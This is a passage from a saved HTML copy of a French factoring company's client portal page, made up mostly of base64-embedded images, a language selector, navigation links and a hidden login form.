yi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyi5SWD7gWUdhFDyiFn6z+b39fJBz8dwMsfWPzenr4ISflQ3/2Q==);
    --savepage-url-11: url(data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4QAWRXhpZgAATU0AKgAAAAgAAAAAAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAAKAAEDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAQK/8QAHxAAAQEJAQAAAAAAAAAAAAAAAAYFBwgWGFZYldSX/8QAFQEBAQAAAAAAAAAAAAAAAAAACAn/xAAhEQABAwEJAAAAAAAAAAAAAAAGAAUYQRJFV1hiZpSh1v/aAAwDAQACEQMRAD8Apr5jWylfj6Gou0G8mSkbaSZ0LK5ANmQIjguOc5s8kpuRTPcxZfS7Hmtnfmrpf//Z);
    --savepage-url-14: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAcCAYAAABRVo5BAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuNWWFMmUAAAFoSURBVDhPndGxSsNQFMbxU1vEUZxFOhRXHYr4AoIP4eAoWmzaJhiKoY9QwUF8EPEVlIKLOLnpZhGRCgoK8X9jUu5Jrpha+EHO1+80t4nEcfwvzrAMZ1hGIfA8b6Pb7e73er1qljHvkDdRyTK1ZLTb7ZVOp/NKucXyHNdbXD+Tr9o9tZShGGAcBEGd5Tuuj/iB6QkMtZAZDAZVyjd4YnEUhuFCvqMGG0sn+MI51N0MNWR831+jPEGED/PA8h01GFEU1TjeFQtDVHCB636/P2/31JLB3Q4pPvAUl8zMQ2kwv+HA7qml37BU4RTTd2iowiycYRnOsAxnWIYzLKMYiGyilct20VSZPSSBSB3v2EvnbUxQVz17mIYiIV6wjHv4hU4+SEKRGm4xxsjMhU4+yPA5hbk4c37vDEXWYf7nMT6hHkzSKQQ/xzTHG6bzZTqr46qlJBDx8IjFdG7A3F2/InuYhTMswxn+LZZvdzP1eGNZrKMAAAAASUVORK5CYII=);
  }
</style>


  </head>

<body><div id="conteneur" bis_skin_checked="1"><div id="conteneur2" bis_skin_checked="1"><div id="entete" bis_skin_checked="1"><div class="En-tete" bis_skin_checked="1">		<div class="header1-06_" bis_skin_checked="1">			<select id="flags" name="flags" class="ll_select" style="width:200px" onchange="javascript:change_page('CHANGELANGUE',$('#flags option:selected').val());"><option value="de" title="/tra_cosmos_img/flags/de.png">Deutsche </option><option value="da" title="/tra_cosmos_img/flags/da.png">Dansk </option><option value="en" title="/tra_cosmos_img/flags/en.png">English </option><option value="es" title="/tra_cosmos_img/flags/es.png">Español </option><option value="fr" title="/tra_cosmos_img/flags/fr.png">Français </option><option value="it" title="/tra_cosmos_img/flags/it.png">Italiano </option><option value="nl" title="/tra_cosmos_img/flags/nl.png">Nederlands </option><option value="pl" title="/tra_cosmos_img/flags/pl.png">Polski </option><option value="pt" title="/tra_cosmos_img/flags/pt.png">Português </option><option value="sv" title="/tra_cosmos_img/flags/sv.png">Svensk </option></select>		</div>	<div class="header1-01_" bis_skin_checked="1">		<div class="trad" id="LANG_DECONNEXION" bis_skin_checked="1"><a href="javascript:do_deconnexion('Portail_Deconnexion.or');" bis_skin_checked="1">Déconnexion </a></div>	</div>	<div class="header1-sepbleu" bis_skin_checked="1"></div>		<div class="header1-04_" bis_skin_checked="1">			<div style="display : inline;" id="LANG_LEXIQUE" bis_skin_checked="1"><a data-savepage-href="/S027_E001/S027_E001_fichier_cosmos_fr/lexique_affacturage.pdf" href="?/S027_E001/S027_E001_fichier_cosmos_fr/lexique_affacturage.pdf" target="_blank" id="LANG_LEXIQUE" bis_skin_checked="1">Lexique </a></div>		</div>		<div class="header1-sepbleu" bis_skin_checked="1"></div>	<div class="header1-02_" bis_skin_checked="1">		<div class="trad" id="LANG_CONTACT" bis_skin_checked="1"><a href="javascript:change_page('NL_Transverse.or', 'Contacts', '');" bis_skin_checked="1">Contact </a></div>	</div>	</div>		<div class="Bando_logo" bis_skin_checked="1">          <img data-savepage-currentsrc="?/S027_E001/S027_E001_img_cosmos/header2.gif" data-savepage-src="/S027_E001/S027_E001_img_cosmos/header2.gif" src="data:image/gif;base64,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XvP6174ONrCHLexiE/vYxk42spet7GYz+9nOjja0py3tauPar4PONra3TWhu83PQ7nDHH7uRhCOb+9zoPnIZKtHjdJs7HUxut0Amge4pW6ITstMFNbaBycy8Q9trfoeXAeDXd7xjp4Xw63f7/G+dGkAe72AzAGJh8HicYNFb3vad42Fw1T460quNBT/dEQ9Dcxweuf/YaSzi4egA/Pvgba74xk/eidUSYNDxgC4ACgCOisfDGtINesZxDvCie/vo3U660ZWO9KU7velQZ7rUnz71qFP96lbPetW3jnWua73rYP+62L1O9rCXfexmTzva1372tqvd7Wx/u9zjTne4233uUze43vfO9773nePvcIc6xPGNayRBCIhPvOIVTwTMNmPxiydHJYiQ+CG8sw6LTwIXCtEJUsxC39oAhzjcofeCF9zgsIiuO8BRCJ0SgBoRX24BdFoImCPA4O7YKSxwD2gACMDnpF/uCnDvaAAY/OI7by3u37HcE4T7HaRQ+TscjYDnqzzcm5C+3mdfAD53ouLRB3X/J77xfMD7/fzoT7/618/+9rv//fCPv/znT//62//++M+//vfP//77//8AGIACOIAEWIDnB3iClzmFNwU50IA40IANWAZ1UAkUWAkp8w9rAIEaGIEMuIHE8A8biANJ4AWcRwqxoAvSEHricDuk53fukHo69Q6zp1MIkAstuFwwKADVEAB9Zn06tQnUAAu9BwDOp3fhtlwg8A2vUHy35w08iAAwCADT0ILItwLf4A2kwIMAYACkR33qEHi65wE7VQCj0IIvSHvIVwCBZ3BD6HsgQA1maIByOId0WId2eId4mId6uId82Id++IfsF26COIiEWIiGmIDiEFjXAAU40IiO/8gD7pQQ7UAMe+CIlniJjVgJ7YCJVLB5m2CCuJCCWaYOLMiC4UaK7uAKurdaAaACgrhc7iACNAhbCICK1QUAIlAjz3c7C5dbNdJ6ADAK6jCDJzB67qACOrUCqhhotxBuyNhnpKgOY8ZaSfiKABAA3hANukd6gqcCm7ZamyCIpniI5FiO5niO6JiO6riO7NiO7viO8BiP8jiP9FiP9niP+JiP+riP/NiP/viPAEmPtzOQgleQBHmQBmmQpPhH22ANVDADM2ADM4ADEwmRPOBkCXEPlMADEAmRFFmRFFkJwlCRFUkFXgADnwgLoXgNWbaC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">		</div> </div><div class="contenu_home" bis_skin_checked="1">

<!-- DEB or-content -->
	<div id="or_content" bis_skin_checked="1">

<form name="formChangePage" method="post" action="/factoring/fr/Portail_Connexion.or"><input type="hidden" name="CWW_FORbM" value="">
<input type="hidden" name="CWW_CTX" value="">

<input value="HOME_IDENT" name="code_page" type="hidden">
<input name="code_projet" type="hidden" value="default">
<input name="code_menu" type="hidden" value="default">
<script data-savepage-type="" type="text/plain"></script>
<input name="code_sessionu" type="hidden" value="">
<input name="code_sessiong" type="hidden" value="0">
</form>
<div class="decoupe-home-02_" bis_skin_checked="1"><img data-savepage-currentsrc="?/S027_E001/S027_E001_fichier_cosmos_fr/GOP-IMG%20accueil%20930x225.JPG" data-savepage-src="/S027_E001/S027_E001_fichier_cosmos_fr/GOP-IMG accueil 930x225.JPG" src="data:image/jpeg;base64,/9j/4QrjRXhpZgAATU0AKgAAAAgABwESAAMAAAABAAEAAAEaAAUAAAABAAAAYgEbAAUAAAABAAAAagEoAAMAAAABAAIAAAExAAIAAAAcAAAAcgEyAAIAAAAUAAAAjodpAAQAAAABAAAApAAAANAACvyAAAAnEAAK/IAAACcQQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzADIwMTg6MDU6MDcgMTU6MDA6NDQAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAADoqADAAQAAAABAAAA4QAAAAAAAAAGAQMAAwAAAAEABgAAARoABQAAAAEAAAEeARsABQAAAAEAAAEmASgAAwAAAAEAAgAAAgEABAAAAAEAAAEuAgIABAAAAAEAAAmtAAAAAAAAAEgAAAABAAAASAAAAAH/2P/tAAxBZG9iZV9DTQAB/+4ADkFkb2JlAGSAAAAAAf/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAENCwsNDg0QDg4QFA4ODhQUDg4ODhQRDAwMDAwREQwMDAwMDBEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8AAEQgAJwCgAwEiAAIRAQMRAf/dAAQACv/EAT8AAAEFAQEBAQEBAAAAAAAAAAMAAQIEBQYHCAkKCwEAAQUBAQEBAQEAAAAAAAAAAQACAwQFBgcICQoLEAABBAEDAgQCBQcGCAUDDDMBAAIRAwQhEjEFQVFhEyJxgTIGFJGhsUIjJBVSwWIzNHKC0UMHJZJT8OHxY3M1FqKygyZEk1RkRcKjdDYX0lXiZfKzhMPTdePzRieUpIW0lcTU5PSltcXV5fVWZnaGlqa2xtbm9jdHV2d3h5ent8fX5/cRAAICAQIEBAMEBQYHBwYFNQEAAhEDITESBEFRYXEiEwUygZEUobFCI8FS0fAzJGLhcoKSQ1MVY3M08SUGFqKygwcmNcLSRJNUoxdkRVU2dGXi8rOEw9N14/NGlKSFtJXE1OT0pbXF1eX1VmZ2hpamtsbW5vYnN0dXZ3eHl6e3x//aAAwDAQACEQMRAD8A1WNCltHgkICeQglW0eCzLA37dc08yI+G1q05QTgUXXOtduDnRO10ccJKRV10vaWvG5jgQ5p7juCs/HsONnV4mW5zmtd+itncXtcHtqtI/f2f+Crfq6Xjj86wf2ygdTxuh49Nrr8qmjNZU5lJuuYLAXDSttRd6vv/ADfamyBIsdEghrdKwcPJ6g3Ly3G6kEtFM7q9dzbYZr6jqvU+mz/DVrtDiUVVttoHts+kQS4HSGPl38hq4v6ttpspwGigXWVE0OLGguaNzm+mbNNlT9y6VnUOndJ6YwZd1WJimxtGOAHEG1occnbtD3/zjbP8xQ4z6hevFY+xmyx9IIb7QpgIGHnYOa1zsLJqyQww/wBNwJaf3bGfTrd/XVkBWKa6HKb+rW/1HfkWTUMmnIf7Q7EBbsn2uALQ57m/T9T3/v8Aprc/Rv3s0dt9tjfCRu2u/rMchDF